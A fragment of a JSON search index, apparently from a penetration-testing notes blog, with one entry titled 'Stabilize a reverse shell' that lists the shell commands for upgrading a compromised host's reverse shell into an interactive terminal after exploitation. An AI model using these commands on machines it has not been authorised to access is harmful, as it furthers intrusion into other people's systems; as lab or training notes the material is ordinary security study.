    "content": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "description": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "tags": [
      "Reverseshell"
    ],
    "title": "Stabilize a reverse shell",
    "uri": "/posts/revshell-upgrade/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  }
]
